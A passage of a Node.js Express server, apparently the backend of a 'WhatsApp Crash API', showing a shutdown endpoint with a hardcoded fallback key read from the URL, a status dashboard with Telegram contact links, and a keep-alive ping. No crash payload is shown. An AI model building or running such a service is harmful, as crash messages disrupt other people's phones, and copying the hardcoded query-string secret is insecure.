  const secretKey = process.env.SHUTDOWN_KEY || 'kuzu@bakuKen234';
  
  if(req.query.key === secretKey) {
    isServerRunning = false;
    res.json({ status: 'Server akan dimatikan' });
    setTimeout(() => {
      process.exit(0);
    }, 1000);
  } else {
    res.status(403).json({ error: 'Unauthorized' });
  }
});
app.get('/status', (req, res) => {
  const uptime = Math.floor((new Date() - startTime) / 1000);
  
  const statusHTML = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>API Status - WhatsApp Crash API</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                line-height: 1.6;
                margin: 0;
                padding: 20px;
                background: #f5f5f5;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            .status-card {
                background: #f8f9fa;
                padding: 20px;
                border-radius: 8px;
                margin-bottom: 20px;
            }
            .status-indicator {
                display: inline-block;
                width: 12px;
                height: 12px;
                border-radius: 50%;
                margin-right: 8px;
            }
            .status-online {
                background-color: #4CAF50;
            }
            .status-offline {
                background-color: #f44336;
            }
            .metric {
                display: flex;
                justify-content: space-between;
                padding: 10px 0;
                border-bottom: 1px solid #eee;
            }
            .metric:last-child {
                border-bottom: none;
            }
            .progress-bar {
                background: #e0e0e0;
                height: 20px;
                border-radius: 10px;
                margin: 10px 0;
                overflow: hidden;
            }
            .progress {
                background: #2196F3;
                height: 100%;
                width: ${(successfulRequests / (totalRequests || 1)) * 100}%;
                transition: width 0.3s ease;
            }
            .dev-info {
                text-align: center;
                margin: 30px 0;
                padding: 20px;
                background: #e8f5e9;
                border-radius: 8px;
            }
            .dev-info a {
                color: #1976D2;
                text-decoration: none;
                font-weight: 500;
            }
            h1 {
                color: #2c3e50;
                text-align: center;
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>API Status Dashboard</h1>
            
            <div class="status-card">
                <h2>
                    <span class="status-indicator ${isWhatsAppConnected ? 'status-online' : 'status-offline'}"></span>
                    Status: ${isWhatsAppConnected ? 'Online' : 'Offline'}
                </h2>
                
                <div class="metric">
                    <span>Uptime:</span>
                    <span>${formatUptime(uptime)}</span>
                </div>
                
                <div class="metric">
                    <span>Total Requests:</span>
                    <span>${totalRequests}</span>
                </div>
                
                <div class="metric">
                    <span>Success Rate:</span>
                    <span>${((successfulRequests / (totalRequests || 1)) * 100).toFixed(2)}%</span>
                </div>
                
                <div class="progress-bar">
                    <div class="progress"></div>
                </div>
                
                <div class="metric">
                    <span>WhatsApp Connection:</span>
                    <span>${isWhatsAppConnected ? '✅ Connected' : '❌ Disconnected'}</span>
                </div>
                
                <div class="metric">
                    <span>Last Updated:</span>
                    <span>${new Date().toLocaleString()}</span>
                </div>
            </div>

            <div class="dev-info">
                <h3>Developer Information</h3>
                <p>
                    <a href="https://t.me/kuzuroken" target="_blank">👨‍💻 Developer Contact</a>
                    <span style="margin: 0 10px">|</span>
                    <a href="https://t.me/idcboutusry" target="_blank">💬 Join Our Group</a>
                </p>
            </div>
        </div>
    </body>
    </html>
  `;

  res.send(statusHTML);
});


function keepAlive() {
  if (!isServerRunning) return;
  
  const url = `https://${process.env.PROJECT_DOMAIN}.glitch.me`;
  https.get(url, (res) => {
    if (res.statusCode === 200) {
      console.log('Server tetap aktif');
    }
  }).on('error', (err) => {
    console.error('Error keeping server alive:', err.message);
  });
}
setInterval(keepAlive, 5 * 60 * 1000);
const startServer = () => {
  const port = process.env.PORT || 3000;
  app.listen(port, '0.0.0.0', () => {
      console.log(`Server berjalan di port ${port}`);
      startSesi();
      isServerRunning = true;
  }).on('error', (err) => {
      console.error('Error starting server:', err);
      isServerRunning = false;
  });
};
startServer();
const startTime = new Date();
let totalRequests = 0;
let successfulRequests = 0;
let failedRequests = 0;
function formatUptime(seconds) {
  const days = Math.floor(seconds / (24 * 60 * 60));
  const hours = Math.floor((seconds % (24 * 60 * 60)) / (60 * 60));
  const minutes = Math.floor((seconds % (60 * 60)) / 60);
  const secs = seconds % 60;

  const parts = [];
  if (days > 0) parts.push(`${days}d`);
  if (hours > 0) parts.push(`${hours}h`);
  if (minutes > 0) parts.push(`${minutes}m`);
  if (secs > 0) parts.push(`${secs}s`);

  return parts.join(' ');
}
app.use((req, res, next) => {
  totalRequests++;
  res.on('finish', () => {
    if (res.statusCode < 400) {
      successfulRequests++;
    } else {
      failedRequests++;
    }
  });
  next();
});
